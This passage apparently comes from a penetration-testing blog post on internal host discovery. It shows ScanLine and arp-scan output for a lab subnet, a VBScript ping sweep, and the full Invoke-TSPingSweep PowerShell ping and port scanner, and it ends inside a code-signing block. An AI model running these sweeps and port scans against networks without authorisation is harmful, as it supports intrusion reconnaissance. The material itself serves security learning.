192.168.7.0-255<br>ScanLine (TM) 1.01<br>Copyright (c) Foundstone, Inc. 2002<br>http://www.foundstone.com<br>Scan of 256 IPs started at Tue Feb 23 22:07:40 2021<br>-------------------------------------------------------------------------------<br>192.168.7.7<br>Responded in 0 ms.<br>0 hops away<br>Responds with ICMP unreachable: No<br>-------------------------------------------------------------------------------<br>192.168.7.107<br>Responded in 0 ms.<br>0 hops away<br>Responds with ICMP unreachable: No<br>-------------------------------------------------------------------------------<br>192.168.7.110<br>Responded in 0 ms.<br>0 hops away<br>Responds with ICMP unreachable: No<br>-------------------------------------------------------------------------------<br>Scan finished at Tue Feb 23 22:07:49 2021<br>3 IPs and 0 ports scanned in 0 hours 0 mins 9.16 secs<br></code></pre></td></tr></table></figure><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p><a href="https://github.com/QbsuranAlang/arp-scan-windows-">arp-scan-windows</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">arp-scan.exe -t 192.168.7.0/24<br>Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 11.278300<br>Reply that 00:0C:29:1D:82:CF is 192.168.7.7 in 16.140500<br>Reply that 00:0C:29:A9:62:98 is 192.168.7.107 in 15.233500<br>Reply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.080700<br>Reply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.071500<br></code></pre></td></tr></table></figure><h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vbs">strSubNet = <span class="hljs-string">&quot;192.168.7.&quot;</span><br><span class="hljs-keyword">Set</span> objFSO= <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>)<br><span class="hljs-keyword">Set</span> objTS = objfso.CreateTextFile(<span class="hljs-string">&quot;C:\Result.txt&quot;</span>)<br><span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-number">254</span><br>strComputer = strSubNet &amp; i<br>blnResult = Ping(strComputer)<br><span class="hljs-keyword">If</span> blnResult = <span class="hljs-literal">True</span> <span class="hljs-keyword">Then</span><br>objTS.WriteLine strComputer &amp; <span class="hljs-string">&quot; is alived ! :) &quot;</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Next</span><br>objTS.Close<br>WScript.Echo <span class="hljs-string">&quot;All Ping Scan , All Done ! :) &quot;</span><br><span class="hljs-keyword">Function</span> Ping(strComputer)<br><span class="hljs-keyword">Set</span> objWMIService = <span class="hljs-built_in">GetObject</span>(<span class="hljs-string">&quot;winmgmts:\\.\root\cimv2&quot;</span>)<br><span class="hljs-keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="hljs-string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="hljs-string">&quot;&#x27;&quot;</span>)<br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> objItem <span class="hljs-keyword">In</span> colItems<br><span class="hljs-keyword">Select</span> <span class="hljs-keyword">case</span> objItem.StatusCode<br><span class="hljs-keyword">Case</span> <span class="hljs-number">0</span><br>Ping = <span class="hljs-literal">True</span><br><span class="hljs-keyword">Case</span> <span class="hljs-keyword">Else</span><br>Ping = <span class="hljs-literal">False</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">select</span><br><span class="hljs-keyword">Exit</span> <span class="hljs-keyword">For</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br></code></pre></td></tr></table></figure><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p><code>Invoke-TSPingSweep.ps1</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Invoke-TSPingSweep</span></span> &#123;<br>  <span class="hljs-comment">&lt;#</span><br><span class="hljs-comment">    <span class="hljs-doctag">.SYNOPSIS</span></span><br><span class="hljs-comment">    Scan IP-Addresses, Ports and HostNames</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.DESCRIPTION</span></span><br><span class="hljs-comment">    Scan for IP-Addresses, HostNames and open Ports in your Network.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER StartAddress</span></span><br><span class="hljs-comment">    StartAddress Range</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER EndAddress</span></span><br><span class="hljs-comment">    EndAddress Range</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER ResolveHost</span></span><br><span class="hljs-comment">    Resolve HostName</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER ScanPort</span></span><br><span class="hljs-comment">    Perform a PortScan</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER Ports</span></span><br><span class="hljs-comment">    Ports That should be scanned, default values are: 21,22,23,53,69,71,80,98,110,139,111,</span><br><span class="hljs-comment">    389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,</span><br><span class="hljs-comment">    5801,5900,5555,5901</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER TimeOut</span></span><br><span class="hljs-comment">    Time (in MilliSeconds) before TimeOut, Default set to 100</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort -TimeOut 500</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort -Port 80</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.LINK</span></span><br><span class="hljs-comment">    http://www.truesec.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.NOTES</span></span><br><span class="hljs-comment">    Goude 2012, TrueSec</span><br><span class="hljs-comment">  #&gt;</span><br>  <span class="hljs-keyword">Param</span>(<br>    [<span class="hljs-type">parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$true</span>,<br>      <span class="hljs-type">Position</span> = <span class="hljs-number">0</span>)]<br>    [<span class="hljs-type">ValidatePattern</span>(<span class="hljs-string">&quot;\b\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\b&quot;</span>)]<br>    [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$StartAddress</span>,<br>    [<span class="hljs-type">parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$true</span>,<br>      <span class="hljs-type">Position</span> = <span class="hljs-number">1</span>)]<br>    [<span class="hljs-type">ValidatePattern</span>(<span class="hljs-string">&quot;\b\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\b&quot;</span>)]<br>    [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$EndAddress</span>,<br>    [<span class="hljs-type">switch</span>]<span class="hljs-variable">$ResolveHost</span>,<br>    [<span class="hljs-type">switch</span>]<span class="hljs-variable">$ScanPort</span>,<br>    [<span class="hljs-built_in">int</span>[]]<span class="hljs-variable">$Ports</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">53</span>,<span class="hljs-number">69</span>,<span class="hljs-number">71</span>,<span class="hljs-number">80</span>,<span class="hljs-number">98</span>,<span class="hljs-number">110</span>,<span class="hljs-number">139</span>,<span class="hljs-number">111</span>,<span class="hljs-number">389</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">1080</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">2001</span>,<span class="hljs-number">2049</span>,<span class="hljs-number">3001</span>,<span class="hljs-number">3128</span>,<span class="hljs-number">5222</span>,<span class="hljs-number">6667</span>,<span class="hljs-number">6868</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">7878</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">5801</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">5555</span>,<span class="hljs-number">5901</span>),<br>    [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$TimeOut</span> = <span class="hljs-number">100</span><br>  )<br>  <span class="hljs-keyword">Begin</span> &#123;<br>    <span class="hljs-variable">$ping</span> = <span class="hljs-built_in">New-Object</span> System.Net.Networkinformation.Ping<br>  &#125;<br>  <span class="hljs-keyword">Process</span> &#123;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>])) &#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$b</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">2</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">2</span>])) &#123;<br>          <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$d</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>])) &#123;<br>            <span class="hljs-built_in">write-progress</span> <span class="hljs-literal">-activity</span> PingSweep <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span> <span class="hljs-literal">-percentcomplete</span> ((<span class="hljs-variable">$d</span>/(<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>])) * <span class="hljs-number">100</span>)<br>            <span class="hljs-variable">$pingStatus</span> = <span class="hljs-variable">$ping</span>.Send(<span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span>,<span class="hljs-variable">$TimeOut</span>)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pingStatus</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Success&quot;</span>) &#123;<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ResolveHost</span>) &#123;<br>                <span class="hljs-built_in">write-progress</span> <span class="hljs-literal">-activity</span> ResolveHost <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span> <span class="hljs-literal">-percentcomplete</span> ((<span class="hljs-variable">$d</span>/(<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>])) * <span class="hljs-number">100</span>) <span class="hljs-literal">-Id</span> <span class="hljs-number">1</span><br>                <span class="hljs-variable">$getHostEntry</span> = [<span class="hljs-type">Net.DNS</span>]::BeginGetHostEntry(<span class="hljs-variable">$pingStatus</span>.Address, <span class="hljs-variable">$null</span>, <span class="hljs-variable">$null</span>)<br>              &#125;<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ScanPort</span>) &#123;<br>                <span class="hljs-variable">$openPorts</span> = <span class="hljs-selector-tag">@</span>()<br>                <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-le</span> <span class="hljs-variable">$ports</span>.Count;<span class="hljs-variable">$i</span>++) &#123;<br>                  <span class="hljs-variable">$port</span> = <span class="hljs-variable">$Ports</span>[(<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>)]<br>                  <span class="hljs-built_in">write-progress</span> <span class="hljs-literal">-activity</span> PortScan <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span> <span class="hljs-literal">-percentcomplete</span> ((<span class="hljs-variable">$i</span>/(<span class="hljs-variable">$Ports</span>.Count)) * <span class="hljs-number">100</span>) <span class="hljs-literal">-Id</span> <span class="hljs-number">2</span><br>                  <span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TcpClient<br>                  <span class="hljs-variable">$beginConnect</span> = <span class="hljs-variable">$client</span>.BeginConnect(<span class="hljs-variable">$pingStatus</span>.Address,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$null</span>,<span class="hljs-variable">$null</span>)<br>                  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$client</span>.Connected) &#123;<br>                    <span class="hljs-variable">$openPorts</span> += <span class="hljs-variable">$port</span><br>                  &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment"># Wait</span><br>                    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milli</span> <span class="hljs-variable">$TimeOut</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$client</span>.Connected) &#123;<br>                      <span class="hljs-variable">$openPorts</span> += <span class="hljs-variable">$port</span><br>                    &#125;<br>                  &#125;<br>                  <span class="hljs-variable">$client</span>.Close()<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ResolveHost</span>) &#123;<br>                <span class="hljs-variable">$hostName</span> = ([<span class="hljs-type">Net.DNS</span>]::EndGetHostEntry([<span class="hljs-type">IAsyncResult</span>]<span class="hljs-variable">$getHostEntry</span>)).HostName<br>              &#125;<br>              <span class="hljs-comment"># Return Object</span><br>              <span class="hljs-built_in">New-Object</span> PSObject <span class="hljs-literal">-Property</span> <span class="hljs-selector-tag">@</span>&#123;<br>                IPAddress = <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span>;<br>                HostName = <span class="hljs-variable">$hostName</span>;<br>                Ports = <span class="hljs-variable">$openPorts</span><br>              &#125; | <span class="hljs-built_in">Select-Object</span> IPAddress, HostName, Ports<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">End</span> &#123;<br>  &#125;<br>&#125;<br><span class="hljs-comment"># SIG # Begin signature block</span><br><span class="hljs-comment"># MIINGAYJKoZIhvcNAQcCoIINCTCCDQUCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB</span><br><span class="hljs-comment"># gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR</span><br><span class="hljs-comment"># AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUDtjslARLrEIY+LjC2tihCYoE</span><br><span class="hljs-comment"># ax2gggpaMIIFIjCCBAqgAwIBAgIQAupQIxjzGlMFoE+9rHncOTANBgkqhkiG9w0B</span><br><span class="hljs-comment"># AQsFADByMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYD</span><br><span class="hljs-comment"># VQQLExB3d3cuZGlnaWNlcnQuY29tMTEwLwYDVQQDEyhEaWdpQ2VydCBTSEEyIEFz</span><br><span class="hljs-comment"># c3VyZWQgSUQgQ29kZSBTaWduaW5nIENBMB4XDTE0MDcxNzAwMDAwMFoXDTE1MDcy</span><br><span class="hljs-comment"># MjEyMDAwMFowaTELMAkGA1UEBhMCQ0ExCzAJBgNVBAgTAk9OMREwDwYDVQQHEwhI</span><br><span class="hljs-comment"># YW1pbHRvbjEcMBoGA1UEChMTRGF2aWQgV2F5bmUgSm9obnNvbjEcMBoGA1UEAxMT</span><br><span class="hljs-comment"># RGF2aWQgV2F5bmUgSm9obnNvbjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC</span><br><span class="hljs-comment"># ggEBAM3+T+61MoGxUHnoK0b2GgO17e0sW8ugwAH966Z1JIzQvXFa707SZvTJgmra</span><br><span class="hljs-comment"># ZsCn9fU+i9KhC0nUpA4hAv/b1MCeqGq1O0f3ffiwsxhTG3Z4J8mEl5eSdcRgeb+1</span><br><span class="hljs-comment"># jaKI3oHkbX+zxqOLSaRSQPn3XygMAfrcD/QI4vsx8o2lTUsPJEy2c0z57e1VzWlq</span><br><span class="hljs-comment"># KHqo18lVxDq/YF+fKCAJL57zjXSBPPmb/sNj8VgoxXS6EUAC5c3tb+CJfNP2U9vV</span><br><span class="hljs-comment"># oy5YeUP9bNwq2aXkW0+xZIipbJonZwN+bIsbgCC5eb2aqapBgJrgds8cw8WKiZvy</span><br><span class="hljs-comment"># Zx2qT7hy9HT+LUOI0l0K0w31dF8CAwEAAaOCAbswggG3MB8GA1UdIwQYMBaAFFrE</span><br><span class="hljs-comment"># uXsqCqOl6nEDwGD5LfZldQ5YMB0GA1UdDgQWBBTnMIKoGnZIswBx8nuJckJGsFDU</span><br><span class="hljs-comment"># lDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMwdwYDVR0fBHAw</span><br><span class="hljs-comment"># bjA1oDOgMYYvaHR0cDovL2NybDMuZGlnaWNlcnQuY29tL3NoYTItYXNzdXJlZC1j</span><br><span class="hljs-comment"># cy1nMS5jcmwwNaAzoDGGL2h0dHA6Ly9jcmw0LmRpZ2ljZXJ0LmNvbS9zaGEyLWFz</span><br><span class="hljs-comment"># c3VyZWQtY3MtZzEuY3JsMEIGA1UdIAQ7MDkwNwYJYIZIAYb9bAMBMCowKAYIKwYB</span><br><span class="hljs-comment"># BQUHAgEWHGh0dHBzOi8vd3d3LmRpZ2ljZXJ0LmNvbS9DUFMwgYQGCCsGAQUFBwEB</span><br><span class="hljs-comment"># BHgwdjAkBggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tME4GCCsG</span><br><span class="hljs-comment"># AQUFBzAChkJodHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRTSEEy</span><br><span class="hljs-comment"># QXNzdXJlZElEQ29kZVNpZ25pbmdDQS5jcnQwDAYDVR0TAQH/BAIwADANBgkqhkiG</span><br><span class="hljs-comment"># 9w0BAQsFAAOCAQEAVlkBmOEKRw2O66aloy9tNoQNIWz3AduGBfnf9gvyRFvSuKm0</span><br><span class="hljs-comment"># Zq3A6lRej8FPxC5Kbwswxtl2L/pjyrlYzUs+XuYe9Ua9YMIdhbyjUol4Z46jhOrO</span><br><span class="hljs-comment"># TDl18txaoNpGE9JXo8SLZHibwz97H3+paRm16aygM5R3uQ0xSQ1NFqDJ53YRvOqT</span><br><span class="hljs-comment"># 60/tF9E8zNx4hOH1lw1CDPu0K3nL2PusLUVzCpwNunQzGoZfVtlnV2x4EgXyZ9G1</span><br><span class="hljs-comment"># x4odcYZwKpkWPKA4bWAG+Img5+dgGEOqoUHh4jm2IKijm1jz7BRcJUMAwa2Qcbc2</span><br><span class="hljs-comment"># ttQbSj/7xZXL470VG3WjLWNWkRaRQAkzOajhpTCCBTAwggQYoAMCAQICEAQJGBtf</span><br><span class="hljs-comment"># 1btmdVNDtW+VUAgwDQYJKoZIhvcNAQELBQAwZTELMAkGA1UEBhMCVVMxFTATBgNV</span><br><span class="hljs-comment"># BAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTEkMCIG</span><br><span class="hljs-comment"># A1UEAxMbRGlnaUNlcnQgQXNzdXJlZCBJRCBSb290IENBMB4XDTEzMTAyMjEyMDAw</span><br><span class="hljs-comment"># MFoXDTI4MTAyMjEyMDAwMFowcjELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lD</span><br><span class="hljs-comment"># ZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTExMC8GA1UEAxMoRGln</span><br><span class="hljs-comment"># aUNlcnQgU0hBMiBBc3N1cmVkIElEIENvZGUgU2lnbmluZyBDQTCCASIwDQYJKoZI</span><br><span class="hljs-comment"># hvcNAQEBBQADggEPADCCAQoCggEBAPjTsxx/DhGvZ3cH0wsxSRnP0PtFmbE620T1</span><br><span class="hljs-comment"># f+Wondsy13Hqdp0FLreP+pJDwKX5idQ3Gde2qvCchqXYJawOeSg6funRZ9PG+ykn</span><br><span class="hljs-comment"># x9N7I5TkkSOWkHeC+aGEI2YSVDNQdLEoJrskacLCUvIUZ4qJRdQtoaPpiCwgla4c</span><br><span class="hljs-comment"># SocI3wz14k1gGL6qxLKucDFmM3E+rHCiq85/6XzLkqHlOzEcz+ryCuRXu0q16XTm</span><br><span class="hljs-comment"># K/5sy350OTYNkO/ktU6kqepqCquE86xnTrXE94zRICUj6whkPlKWwfIPEvTFjg/B</span><br><span class="hljs-comment"># ougsUfdzvL2FsWKDc0GCB+Q4i2pzINAPZHM8np+mM6n9Gd8lk9ECAwEAAaOCAc0w</span><br><span class="hljs-comment"># ggHJMBIGA1UdEwEB/wQIMAYBAf8CAQAwDgYDVR0PAQH/BAQDAgGGMBMGA1UdJQQM</span><br><span class="hljs-comment"># MAoGCCsGAQUFBwMDMHkGCCsGAQUFBwEBBG0wazAkBggrBgEFBQcwAYYYaHR0cDov</span><br><span class="hljs-comment"># L29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRwOi8vY2FjZXJ0cy5k</span><br><span class="hljs-comment"># aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3J0MIGBBgNVHR8E</span><br><span class="hljs-comment"># ejB4MDqgOKA2hjRodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1</span><br><span class="hljs-comment"># cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v</span><br><span class="hljs-comment"># RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsME8GA1UdIARIMEYwOAYKYIZIAYb9</span><br><span class="hljs-comment"># bAACBDAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2VydC5jb20vQ1BT</span><br><span class="hljs-comment"># MAoGCGCGSAGG/WwDMB0GA1UdDgQWBBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAfBgNV</span><br><span class="hljs-comment"># HSMEGDAWgBRF66Kv9JLLgjEtUYunpyGd823IDzANBgkqhkiG9w0BAQsFAAOCAQEA</span><br><span class="hljs-comment"># PuwNWiSz8yLRFcgsfCUpdqgdXRwtOhrE7zBh134LYP3DPQ/Er4v97yrfIFU3sOH2</span><br><span 